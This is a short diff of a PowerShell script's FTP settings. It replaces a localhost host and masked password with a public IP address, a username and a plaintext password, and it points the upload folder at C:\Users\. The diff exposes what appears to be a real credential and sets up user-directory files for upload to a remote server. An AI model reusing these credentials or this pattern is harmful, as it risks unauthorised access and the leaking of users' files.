@@ -1,7 +1,7 @@
 # FTP Server Variables
-$FTPHost = 'ftp://127.0.0.1/'
-$FTPUser = 'root' #username
-$FTPPass = '****************' #pwd
+$FTPHost = 'ftp://52.143.167.164/'
+$FTPUser = 'dumdumftp' #username
+$FTPPass = 'XwvCQSJ&2(5T43P}g9Z0' #pwd
 
 #Directory where to find shit to upload
 $UploadFolder = "C:\Users\"
